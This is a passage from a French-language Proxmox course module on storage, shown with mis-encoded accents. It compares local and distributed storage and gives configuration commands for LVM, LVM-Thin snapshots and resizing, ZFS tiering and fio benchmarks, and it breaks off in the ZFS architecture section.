**Stockage haute performance :** Configurez des bonds dÃ©diÃ©s pour le trafic de stockage (iSCSI, NFS) avec des VLAN isolÃ©s. Utilisez des interfaces 10GbE ou plus pour Ã©viter les goulots d'Ã©tranglement.

**Laboratoire de test :** Utilisez le mode active-backup pour simplifier la configuration tout en conservant la redondance. Testez diffÃ©rents modes de bonding pour comprendre leur impact sur les performances applicatives.

---


# Module 4 : Stockage

## 4.1 Stockage local vs distribuÃ©

### Philosophies du stockage moderne

Le choix entre stockage local et distribuÃ© reprÃ©sente une dÃ©cision architecturale fondamentale qui impacte performance, disponibilitÃ©, coÃ»t et complexitÃ© de votre infrastructure. Cette dÃ©cision ressemble au choix entre **possÃ©der sa propre voiture** (stockage local) ou **utiliser un service de transport partagÃ©** (stockage distribuÃ©) : chaque approche a ses avantages selon le contexte d'utilisation.

Le stockage local offre des performances maximales et une simplicitÃ© de gestion, mais crÃ©e des silos de donnÃ©es et des points de dÃ©faillance unique. Le stockage distribuÃ© apporte redondance, scalabilitÃ© et flexibilitÃ©, au prix d'une complexitÃ© accrue et de performances potentiellement rÃ©duites.

### Architecture de stockage local

```
Stockage Local - Architecture Node :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              Serveur Proxmox                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                   VMs                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚  â”‚ VM 101  â”‚ â”‚ VM 102  â”‚ â”‚ VM 103  â”‚       â”‚
â”‚  â”‚ 50 GB   â”‚ â”‚ 100 GB  â”‚ â”‚ 75 GB   â”‚       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚            Hyperviseur (Proxmox)            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚         LVM / ZFS / ext4            â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚              Stockage Physique              â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
â”‚  â”‚ SSD 1   â”‚ â”‚ SSD 2   â”‚ â”‚ HDD 1   â”‚       â”‚
â”‚  â”‚ 500 GB  â”‚ â”‚ 500 GB  â”‚ â”‚ 2 TB    â”‚       â”‚
â”‚  â”‚ (OS)    â”‚ â”‚ (VMs)   â”‚ â”‚ (Backup)â”‚       â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages :
âœ“ Performance maximale (accÃ¨s direct)
âœ“ Latence prÃ©visible (<1ms)
âœ“ SimplicitÃ© de configuration
âœ“ CoÃ»t rÃ©duit (pas d'infrastructure rÃ©seau)
âœ“ Isolation complÃ¨te des donnÃ©es

InconvÃ©nients :
âœ— Pas de migration Ã  chaud
âœ— Point de dÃ©faillance unique
âœ— ScalabilitÃ© limitÃ©e
âœ— Gestion des sauvegardes complexe
âœ— Utilisation inÃ©gale des ressources
```

### Architecture de stockage distribuÃ©

```
Stockage DistribuÃ© - Architecture Cluster :

Node 1                Node 2                Node 3
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     VMs     â”‚      â”‚     VMs     â”‚      â”‚     VMs     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Proxmox    â”‚â—„â”€â”€â”€â”€â–ºâ”‚  Proxmox    â”‚â—„â”€â”€â”€â”€â–ºâ”‚  Proxmox    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Ceph OSD 1  â”‚      â”‚ Ceph OSD 2  â”‚      â”‚ Ceph OSD 3  â”‚
â”‚ 1TB SSD     â”‚      â”‚ 1TB SSD     â”‚      â”‚ 1TB SSD     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚                     â”‚                     â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â”‚
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚ Pool Ceph   â”‚
                    â”‚ 3TB total   â”‚
                    â”‚ RÃ©plication â”‚
                    â”‚ 3 copies    â”‚
                    â”‚ 1TB utile   â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages :
âœ“ Haute disponibilitÃ© (pas de SPOF)
âœ“ Migration Ã  chaud des VMs
âœ“ ScalabilitÃ© horizontale
âœ“ Auto-rÃ©paration des donnÃ©es
âœ“ Gestion centralisÃ©e

InconvÃ©nients :
âœ— Latence rÃ©seau (2-10ms)
âœ— ComplexitÃ© de configuration
âœ— Overhead de rÃ©plication
âœ— DÃ©pendance rÃ©seau
âœ— CoÃ»t infrastructure Ã©levÃ©
```

### Comparaison des technologies de stockage

```
Matrice de comparaison stockage :

Technologie    â”‚Performanceâ”‚DisponibilitÃ©â”‚ComplexitÃ©â”‚CoÃ»tâ”‚Usage optimal
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Local SSD      â”‚    â˜…â˜…â˜…â˜…â˜…  â”‚     â˜…       â”‚    â˜…     â”‚ â˜…â˜… â”‚Dev/Test/Edge
Local NVMe     â”‚    â˜…â˜…â˜…â˜…â˜…  â”‚     â˜…       â”‚    â˜…     â”‚ â˜…â˜…â˜…â”‚HPC/Database
iSCSI SAN      â”‚    â˜…â˜…â˜…â˜…   â”‚    â˜…â˜…â˜…â˜…     â”‚   â˜…â˜…â˜…    â”‚â˜…â˜…â˜…â˜…â”‚Enterprise
NFS            â”‚    â˜…â˜…â˜…    â”‚    â˜…â˜…â˜…      â”‚   â˜…â˜…     â”‚ â˜…â˜… â”‚Partage fichiers
Ceph RBD       â”‚    â˜…â˜…â˜…    â”‚    â˜…â˜…â˜…â˜…â˜…    â”‚   â˜…â˜…â˜…â˜…â˜…  â”‚ â˜…â˜… â”‚Cloud/Scale-out
GlusterFS      â”‚    â˜…â˜…     â”‚    â˜…â˜…â˜…â˜…     â”‚   â˜…â˜…â˜…â˜…   â”‚ â˜…  â”‚Archive/Backup
```

### Stockage hybride : Le meilleur des deux mondes

Une approche hybride combine stockage local pour les performances critiques et stockage distribuÃ© pour la redondance et la flexibilitÃ©.

**Architecture hybride recommandÃ©e :**

```bash
# Stockage local pour :
# - OS des VMs (boot rapide)
# - Bases de donnÃ©es (latence critique)
# - Logs temporaires
local-lvm: /dev/sda (SSD 500GB)

# Stockage distribuÃ© pour :
# - Images ISO/templates
# - Sauvegardes
# - VMs non-critiques
ceph: pool production (rÃ©plication 3)

# Configuration Proxmox
pvesm add lvm local-lvm --vgname pve --content images
pvesm add ceph ceph-storage --pool production --content images,backup
```

### Tiering de stockage

Le **tiering** organise les donnÃ©es selon leur frÃ©quence d'accÃ¨s et leur criticitÃ©, optimisant le rapport performance/coÃ»t.

```
Pyramide de tiering :

Tier 0 (Hot) - NVMe SSD
â”œâ”€â”€ DonnÃ©es critiques haute frÃ©quence
â”œâ”€â”€ Bases de donnÃ©es actives
â”œâ”€â”€ Logs en temps rÃ©el
â””â”€â”€ CoÃ»t : â˜…â˜…â˜…â˜…â˜… | Performance : â˜…â˜…â˜…â˜…â˜…

Tier 1 (Warm) - SATA SSD  
â”œâ”€â”€ VMs de production
â”œâ”€â”€ Applications mÃ©tier
â”œâ”€â”€ DonnÃ©es frÃ©quemment accÃ©dÃ©es
â””â”€â”€ CoÃ»t : â˜…â˜…â˜… | Performance : â˜…â˜…â˜…â˜…

Tier 2 (Cold) - HDD 7200 RPM
â”œâ”€â”€ Archives rÃ©centes
â”œâ”€â”€ Sauvegardes
â”œâ”€â”€ DonnÃ©es peu frÃ©quentes
â””â”€â”€ CoÃ»t : â˜…â˜… | Performance : â˜…â˜…

Tier 3 (Archive) - HDD 5400 RPM / Tape
â”œâ”€â”€ Archives long terme
â”œâ”€â”€ Compliance/Audit
â”œâ”€â”€ DonnÃ©es rarement accÃ©dÃ©es
â””â”€â”€ CoÃ»t : â˜… | Performance : â˜…
```

**ImplÃ©mentation automatique du tiering :**

```bash
# ZFS avec tiering automatique
zpool create storage \
    special mirror /dev/nvme0n1 /dev/nvme1n1 \
    mirror /dev/sda /dev/sdb \
    cache /dev/nvme2n1

# RÃ¨gles de placement automatique
zfs set special_small_blocks=32K storage
zfs set primarycache=metadata storage
```

### MÃ©triques de performance stockage

**IOPS (Input/Output Operations Per Second)** mesure le nombre d'opÃ©rations de lecture/Ã©criture par seconde. Cette mÃ©trique est cruciale pour les bases de donnÃ©es et applications transactionnelles.

**Latence** reprÃ©sente le temps de rÃ©ponse d'une opÃ©ration I/O. Une latence faible est critique pour les applications interactives.

**DÃ©bit (Throughput)** mesure la quantitÃ© de donnÃ©es transfÃ©rÃ©es par unitÃ© de temps, important pour les applications de streaming ou de sauvegarde.

```bash
# Benchmark complet avec fio
fio --name=random-read --ioengine=libaio --rw=randread --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting
fio --name=random-write --ioengine=libaio --rw=randwrite --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting
fio --name=sequential-read --ioengine=libaio --rw=read --bs=1M --size=1G --numjobs=1 --runtime=60 --group_reporting
fio --name=sequential-write --ioengine=libaio --rw=write --bs=1M --size=1G --numjobs=1 --runtime=60 --group_reporting

# Monitoring en temps rÃ©el
iostat -x 1
iotop -o
```

---

## 4.2 LVM et LVM-Thin

### Logical Volume Manager (LVM)

**LVM** rÃ©volutionne la gestion du stockage en introduisant une couche d'abstraction entre le stockage physique et les systÃ¨mes de fichiers. Cette abstraction permet de redimensionner, dÃ©placer et gÃ©rer les volumes de maniÃ¨re flexible, sans interruption de service.

Imaginez LVM comme un **gestionnaire immobilier intelligent** qui peut redistribuer l'espace entre diffÃ©rents locataires (volumes logiques) selon leurs besoins, agrandir ou rÃ©duire les appartements (redimensionnement), et mÃªme dÃ©mÃ©nager des locataires vers de nouveaux bÃ¢timents (migration) sans interruption.

### Architecture LVM

```
Architecture LVM complÃ¨te :

Disques Physiques
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ /dev/sdaâ”‚ â”‚ /dev/sdbâ”‚ â”‚ /dev/sdcâ”‚
â”‚ 1TB SSD â”‚ â”‚ 1TB SSD â”‚ â”‚ 2TB HDD â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚           â”‚           â”‚
     â–¼           â–¼           â–¼
Physical Volumes (PV)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   PV1   â”‚ â”‚   PV2   â”‚ â”‚   PV3   â”‚
â”‚ 1TB SSD â”‚ â”‚ 1TB SSD â”‚ â”‚ 2TB HDD â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚           â”‚           â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â–¼
Volume Group (VG)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚            vg-storage           â”‚
â”‚         4TB total space         â”‚
â”‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚    â”‚ SSD Poolâ”‚  HDD Pool   â”‚    â”‚
â”‚    â”‚  2TB    â”‚    2TB      â”‚    â”‚
â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     â–¼           â–¼           â–¼
Logical Volumes (LV)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ lv-vm1  â”‚ â”‚ lv-vm2  â”‚ â”‚lv-backupâ”‚
â”‚ 100GB   â”‚ â”‚ 200GB   â”‚ â”‚ 500GB   â”‚
â”‚ (SSD)   â”‚ â”‚ (SSD)   â”‚ â”‚ (HDD)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     â”‚           â”‚           â”‚
     â–¼           â–¼           â–¼
SystÃ¨mes de fichiers
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ext4   â”‚ â”‚  xfs    â”‚ â”‚  ext4   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Configuration LVM de base

**CrÃ©ation d'une infrastructure LVM complÃ¨te :**

```bash
# 1. PrÃ©paration des disques
# CrÃ©ation des partitions (optionnel, peut utiliser disques entiers)
fdisk /dev/sda
# CrÃ©er partition type 8e (Linux LVM)

# 2. CrÃ©ation des Physical Volumes
pvcreate /dev/sda1 /dev/sdb1 /dev/sdc1

# VÃ©rification
pvdisplay
pvs

# 3. CrÃ©ation du Volume Group
vgcreate vg-storage /dev/sda1 /dev/sdb1 /dev/sdc1

# VÃ©rification
vgdisplay vg-storage
vgs

# 4. CrÃ©ation des Logical Volumes
lvcreate -L 100G -n lv-vm1 vg-storage
lvcreate -L 200G -n lv-vm2 vg-storage
lvcreate -L 500G -n lv-backup vg-storage

# VÃ©rification
lvdisplay
lvs

# 5. CrÃ©ation des systÃ¨mes de fichiers
mkfs.ext4 /dev/vg-storage/lv-vm1
mkfs.xfs /dev/vg-storage/lv-vm2
mkfs.ext4 /dev/vg-storage/lv-backup
```

### LVM-Thin : Provisioning Ã  la demande

**LVM-Thin** introduit le concept de **thin provisioning** : allouer de l'espace logique sans consommer immÃ©diatement l'espace physique. Cette technique permet de sur-allouer l'espace disque et de ne consommer l'espace rÃ©el qu'au fur et Ã  mesure des Ã©critures.

**Avantages du thin provisioning :**
- **Ã‰conomie d'espace** : Allocation Ã  la demande
- **Snapshots efficaces** : Partage des blocs communs
- **FlexibilitÃ©** : Redimensionnement dynamique
- **Optimisation** : Ã‰limination des zÃ©ros

```
Architecture LVM-Thin :

Volume Group (VG)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              vg-storage                 â”‚
â”‚                2TB total                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚         Thin Pool                   â”‚â”‚
â”‚  â”‚        pool-storage                 â”‚â”‚
â”‚  â”‚         1.8TB allouÃ©                â”‚â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚â”‚
â”‚  â”‚  â”‚ Thin LV â”‚ Thin LV â”‚ Thin LV â”‚    â”‚â”‚
â”‚  â”‚  â”‚ vm1-100Gâ”‚ vm2-200Gâ”‚ vm3-150Gâ”‚    â”‚â”‚
â”‚  â”‚  â”‚ (30G    â”‚ (80G    â”‚ (45G    â”‚    â”‚â”‚
â”‚  â”‚  â”‚ utilisÃ©)â”‚ utilisÃ©)â”‚ utilisÃ©)â”‚    â”‚â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Allocation logique : 450GB
Utilisation rÃ©elle : 155GB
Ratio overcommit : 2.9x
```

**Configuration LVM-Thin :**

```bash
# 1. CrÃ©ation du thin pool
lvcreate -L 1.8T --thinpool pool-storage vg-storage

# 2. Configuration des paramÃ¨tres thin
lvchange --zero n vg-storage/pool-storage
lvchange --discards passdown vg-storage/pool-storage

# 3. CrÃ©ation de volumes thin
lvcreate -V 100G --thin vg-storage/pool-storage -n vm1-disk
lvcreate -V 200G --thin vg-storage/pool-storage -n vm2-disk
lvcreate -V 150G --thin vg-storage/pool-storage -n vm3-disk

# 4. Monitoring de l'utilisation
lvs -o+data_percent,metadata_percent vg-storage
```

### Snapshots LVM et LVM-Thin

Les **snapshots** crÃ©ent des copies instantanÃ©es d'un volume Ã  un moment donnÃ©, permettant sauvegardes cohÃ©rentes et tests sans risque.

**Snapshots LVM traditionnels :**

```bash
# CrÃ©ation snapshot traditionnel
lvcreate -L 10G -s -n vm1-snapshot /dev/vg-storage/lv-vm1

# Le snapshot consomme de l'espace pour stocker les diffÃ©rences
# Taille recommandÃ©e : 10-20% du volume original
```

**Snapshots LVM-Thin (recommandÃ©s) :**

```bash
# Snapshot thin (instantanÃ©, pas de prÃ©-allocation)
lvcreate -s vg-storage/vm1-disk -n vm1-snapshot-$(date +%Y%m%d)

# Avantages :
# - CrÃ©ation instantanÃ©e
# - Pas de prÃ©-allocation d'espace
# - Partage des blocs communs
# - Snapshots multiples efficaces

# Gestion des snapshots
lvs -o+origin,snap_percent vg-storage
```

### Redimensionnement et migration

**Redimensionnement Ã  chaud :**

```bash
# Agrandissement d'un volume (Ã  chaud)
lvextend -L +50G /dev/vg-storage/lv-vm1
resize2fs /dev/vg-storage/lv-vm1  # ext4
xfs_growfs /mount/point            # xfs

# RÃ©duction (nÃ©cessite dÃ©montage pour ext4)
umount /mount/point
e2fsck -f /dev/vg-storage/lv-vm1
resize2fs /dev/vg-storage/lv-vm1 80G
lvreduce -L 80G /dev/vg-storage/lv-vm1
mount /dev/vg-storage/lv-vm1 /mount/point
```

**Migration de volumes :**

```bash
# Ajout d'un nouveau disque au VG
pvcreate /dev/sdd1
vgextend vg-storage /dev/sdd1

# Migration des donnÃ©es vers le nouveau disque
pvmove /dev/sda1 /dev/sdd1

# Retrait de l'ancien disque
vgreduce vg-storage /dev/sda1
pvremove /dev/sda1
```

### Monitoring et maintenance LVM

**Surveillance de l'espace thin :**

```bash
# Script de monitoring thin pools
#!/bin/bash
THRESHOLD=80

for pool in $(lvs --noheadings -o lv_name,pool_lv | grep -v "^\s*$" | awk '{print $1}'); do
    usage=$(lvs --noheadings -o data_percent $pool | tr -d ' %')
    if [ ${usage%.*} -gt $THRESHOLD ]; then
        echo "WARNING: Thin pool $pool is ${usage}% full"
        # Alertes ou actions automatiques
    fi
done
```

**Maintenance prÃ©ventive :**

```bash
# Nettoyage des snapshots anciens
find /dev/vg-storage -name "*snapshot*" -mtime +7 -exec lvremove -f {} \;

# Optimisation thin pool
fstrim -v /mount/points  # TRIM sur SSD
lvchange --discards passdown vg-storage/pool-storage

# VÃ©rification intÃ©gritÃ©
vgck vg-storage
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure de dÃ©veloppement :** Utilisez LVM-Thin avec snapshots frÃ©quents pour crÃ©er rapidement des environnements de test. Configurez des scripts automatisÃ©s pour crÃ©er/dÃ©truire des snapshots avant/aprÃ¨s les dÃ©ploiements.

**Sauvegarde cohÃ©rente :** CrÃ©ez des snapshots LVM avant les sauvegardes pour garantir la cohÃ©rence des donnÃ©es, particuliÃ¨rement important pour les bases de donnÃ©es.

**Laboratoire de cybersÃ©curitÃ© :** Exploitez les snapshots pour revenir rapidement Ã  un Ã©tat propre entre les tests. Configurez des templates avec snapshots pour dÃ©ployer instantanÃ©ment des environnements d'attaque standardisÃ©s.

---

## 4.3 ZFS

### ZFS : Le systÃ¨me de fichiers rÃ©volutionnaire

**ZFS (Zettabyte File System)** reprÃ©sente une rÃ©volution dans la gestion du stockage en combinant gestionnaire de volumes, systÃ¨me de fichiers, et fonctionnalitÃ©s RAID dans une solution intÃ©grÃ©e. DÃ©veloppÃ© par Sun Microsystems, ZFS apporte des fonctionnalitÃ©s avancÃ©es : intÃ©gritÃ© des donnÃ©es garantie, snapshots instantanÃ©s, compression transparente, et dÃ©duplication.

Imaginez ZFS comme un **coffre-fort intelligent** qui non seulement stocke vos biens prÃ©cieux, mais vÃ©rifie continuellement leur intÃ©gritÃ©, crÃ©e automatiquement des copies de sauvegarde, et optimise l'espace de stockage en Ã©liminant les doublons.

### Architecture ZFS

```
Architecture ZFS complÃ¨te :

                    ZFS Pool (zpool)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   tank (2TB)                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚              Virtual Devices (vdev)             â”‚â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”‚â”‚
â”‚  â”‚  â”‚   Mirror    â”‚  â”‚    RAIDZ    â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â”‚ Disk A  â”‚ â”‚  â”‚ â”‚ Disk C  â”‚ â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â”‚ 500GB   â”‚ â”‚  â”‚ â”‚ 500GB   â”‚ â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â”‚ Disk B  â”‚ â”‚  â”‚ â”‚ Disk D  â”‚ â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â”‚ 500GB   â”‚ â”‚  â”‚ â”‚ 500GB   â”‚ â”‚              â”‚â”‚
â”‚  â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚              â”‚â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”‚                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚                Datasets                         â”‚â”‚
